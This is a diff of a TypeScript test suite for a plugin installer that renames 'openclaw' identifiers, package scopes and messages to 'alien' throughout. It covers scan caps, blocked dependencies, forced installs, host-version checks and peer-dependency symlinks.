         name: "wide-vendored-tree-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1806,7 +1806,7 @@ describe("installPluginFromArchive", () => {
   });
 
   it("fails package installs when manifest traversal exceeds the directory cap", async () => {
-    vi.stubEnv("OPENCLAW_INSTALL_SCAN_MAX_DIRECTORIES", "4");
+    vi.stubEnv("ALIEN_INSTALL_SCAN_MAX_DIRECTORIES", "4");
 
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
@@ -1814,7 +1814,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "directory-cap-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1834,7 +1834,7 @@ describe("installPluginFromArchive", () => {
   });
 
   it("fails package installs when manifest traversal exceeds the depth cap", async () => {
-    vi.stubEnv("OPENCLAW_INSTALL_SCAN_MAX_DEPTH", "2");
+    vi.stubEnv("ALIEN_INSTALL_SCAN_MAX_DEPTH", "2");
 
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
@@ -1842,7 +1842,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "depth-cap-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1875,7 +1875,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "unreadable-dir-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          alien: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1911,7 +1911,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "multiple-blocked-dependencies-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -1941,7 +1941,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -1973,7 +1973,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "official-dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -1999,14 +1999,14 @@ describe("installPluginFromArchive", () => {
       filter: (entryPath) =>
         !path.relative(sourcePluginDir, entryPath).split(path.sep).includes("node_modules"),
     });
-    vi.mocked(resolveOpenClawPackageRootSync).mockReturnValue(process.cwd());
+    vi.mocked(resolveAlienPackageRootSync).mockReturnValue(process.cwd());
 
     const scanResult = await installSecurityScan.scanPackageInstallSource({
       extensions: ["./index.ts"],
       logger: { warn: vi.fn() },
       packageDir: pluginDir,
       pluginId: "qa-matrix",
-      packageName: "@openclaw/qa-matrix",
+      packageName: "@alien/qa-matrix",
       manifestId: "qa-matrix",
     });
 
@@ -2021,7 +2021,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "forced-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -2355,7 +2355,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hook-findings-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -2412,7 +2412,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-blocked-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2472,7 +2472,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-forced-but-blocked-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2515,7 +2515,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "fresh-force-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -2553,7 +2553,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "replace-force-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -2583,7 +2583,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hidden-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: [".hidden/index.js"] },
+        alien: { extensions: [".hidden/index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2610,7 +2610,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "scan-fail-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};");
@@ -2677,7 +2677,7 @@ describe("installPluginFromDir", () => {
   it("preserves local package manifests without dependency surgery", async () => {
     const { pluginDir, extensionsDir } = setupInstallPluginFromDirFixture({
       devDependencies: {
-        openclaw: "workspace:*",
+        alien: "workspace:*",
         vitest: "^3.0.0",
       },
     });
@@ -2696,7 +2696,7 @@ describe("installPluginFromDir", () => {
     ) as {
       devDependencies?: Record<string, string>;
     };
-    expect(manifest.devDependencies?.openclaw).toBe("workspace:*");
+    expect(manifest.devDependencies?.alien).toBe("workspace:*");
     expect(manifest.devDependencies?.vitest).toBe("^3.0.0");
     expect(vi.mocked(runCommandWithTimeout)).not.toHaveBeenCalled();
   });
@@ -2735,13 +2735,13 @@ describe("installPluginFromDir", () => {
       hostVersion: "2026.3.21",
       minHostVersion: ">=2026.3.22",
       expectedCode: PLUGIN_INSTALL_ERROR_CODE.INCOMPATIBLE_HOST_VERSION,
-      expectedMessageIncludes: ["requires OpenClaw >=2026.3.22, but this host is 2026.3.21"],
+      expectedMessageIncludes: ["requires Alien >=2026.3.22, but this host is 2026.3.21"],
     },
     {
       name: "rejects plugins with invalid minHostVersion metadata",
       minHostVersion: "2026.3.22",
       expectedCode: PLUGIN_INSTALL_ERROR_CODE.INVALID_MIN_HOST_VERSION,
-      expectedMessageIncludes: ["invalid package.json openclaw.install.minHostVersion"],
+      expectedMessageIncludes: ["invalid package.json alien.install.minHostVersion"],
     },
     {
       name: "reports unknown host versions distinctly for minHostVersion-gated plugins",
@@ -2773,7 +2773,7 @@ describe("installPluginFromDir", () => {
     },
   );
 
-  it("uses openclaw.plugin.json id as install key when it differs from package name", async () => {
+  it("uses alien.plugin.json id as install key when it differs from package name", async () => {
     const { pluginDir, extensionsDir } = setupManifestInstallFixture({
       manifestId: "memory-cognee",
     });
@@ -2789,7 +2789,7 @@ describe("installPluginFromDir", () => {
     expect(
       infoMessages.some((msg) =>
         msg.includes(
-          'Plugin manifest id "memory-cognee" differs from npm package name "@openclaw/cognee-openclaw"',
+          'Plugin manifest id "memory-cognee" differs from npm package name "@alien/cognee-alien"',
         ),
       ),
     ).toBe(true);
@@ -2798,7 +2798,7 @@ describe("installPluginFromDir", () => {
   it("does not warn when a scoped npm package name matches the manifest id", async () => {
     const { pluginDir, extensionsDir } = setupManifestInstallFixture({
       manifestId: "matrix",
-      packageName: "@openclaw/matrix",
+      packageName: "@alien/matrix",
     });
 
     const infoMessages: string[] = [];
@@ -2828,7 +2828,7 @@ describe("installPluginFromDir", () => {
     {
       name: "package name keeps scoped plugin id by default",
       setup: () => setupInstallPluginFromDirFixture(),
-      expectedPluginId: "@openclaw/test-plugin",
+      expectedPluginId: "@alien/test-plugin",
       install: (pluginDir: string, extensionsDir: string) =>
         installPluginFromDir({
           dirPath: pluginDir,
@@ -2838,7 +2838,7 @@ describe("installPluginFromDir", () => {
     {
       name: "unscoped expectedPluginId resolves to scoped install id",
       setup: () => setupInstallPluginFromDirFixture(),
-      expectedPluginId: "@openclaw/test-plugin",
+      expectedPluginId: "@alien/test-plugin",
       install: (pluginDir: string, extensionsDir: string) =>
         installPluginFromDir({
           dirPath: pluginDir,
@@ -2936,8 +2936,8 @@ describe("installPluginFromDir", () => {
   });
 });
 
-describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
-  const resolveRootMock = vi.mocked(resolveOpenClawPackageRootSync);
+describe("linkAlienPeerDependencies (via installPluginFromDir)", () => {
+  const resolveRootMock = vi.mocked(resolveAlienPackageRootSync);
 
   function writePluginWithPeerDeps(
     pluginDir: string,
@@ -2950,7 +2950,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
       JSON.stringify({
         name: "peer-dep-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        alien: { extensions: ["index.js"] },
         ...(dependencies ? { dependencies } : {}),
         peerDependencies,
       }),
@@ -2959,13 +2959,13 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n", "utf-8");
   }
 
-  it("creates a node_modules/openclaw symlink when peerDependencies declares openclaw", async () => {
+  it("creates a node_modules/alien symlink when peerDependencies declares alien", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     const run = vi.mocked(runCommandWithTimeout);
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { alien: "*" });
 
     const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
@@ -2974,19 +2974,19 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
       return;
     }
 
-    const symlinkPath = path.join(result.targetDir, "node_modules", "openclaw");
+    const symlinkPath = path.join(result.targetDir, "node_modules", "alien");
     const stat = fs.lstatSync(symlinkPath);
     expect(stat.isSymbolicLink()).toBe(true);
     expect(fs.realpathSync(symlinkPath)).toBe(fs.realpathSync(fakeHostRoot));
     expect(run).not.toHaveBeenCalled();
   });
 
-  it("keeps the openclaw peer symlink when a local plugin already has dependencies", async () => {
+  it("keeps the alien peer symlink when a local plugin already has dependencies", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" }, { "is-number": "7.0.0" });
+    writePluginWithPeerDeps(pluginDir, { alien: "*" }, { "is-number": "7.0.0" });
     fs.mkdirSync(path.join(pluginDir, "node_modules", "is-number"), { recursive: true });
     fs.writeFileSync(
       path.join(pluginDir, "node_modules", "is-number", "package.json"),
@@ -3001,7 +3001,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
       return;
     }
 
-    const symlinkPath = path.join(result.targetDir, "node_modules", "openclaw");
+    const symlinkPath = path.join(result.targetDir, "node_modules", "alien");
     expect(fs.lstatSync(symlinkPath).isSymbolicLink()).toBe(true);
     expect(fs.realpathSync(symlinkPath)).toBe(fs.realpathSync(fakeHostRoot));
     expect(fs.existsSync(path.join(result.targetDir, "node_modules", "is-number"))).toBe(true);
@@ -3022,7 +3022,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     }
 
     const nodeModulesDir = path.join(result.targetDir, "node_modules");
-    const symlinkPath = path.join(nodeModulesDir, "openclaw");
+    const symlinkPath = path.join(nodeModulesDir, "alien");
     expect(fs.existsSync(symlinkPath)).toBe(false);
   });
 
@@ -3031,7 +3031,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { alien: "*" });
 
     // First install
     const { result: first } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
@@ -3049,19 +3049,19 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     if (!second.ok) {
       return;
     }
-    const symlinkPath = path.join(second.targetDir, "node_modules", "openclaw");
+    const symlinkPath = path.join(second.targetDir, "node_modules", "alien");
     expect(fs.lstatSync(symlinkPath).isSymbolicLink()).toBe(true);
   });
 
-  it("warns and skips when resolveOpenClawPackageRootSync returns null", async () => {
+  it("warns and skips when resolveAlienPackageRootSync returns null", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     resolveRootMock.mockReturnValue(null);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { alien: "*" });
 
     const { result, warnings } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
     expect(result.ok).toBe(true);
-    expect(warnings.some((w) => w.includes("Could not locate openclaw package root"))).toBe(true);
+    expect(warnings.some((w) => w.includes("Could not locate alien package root"))).toBe(true);
   });
 });
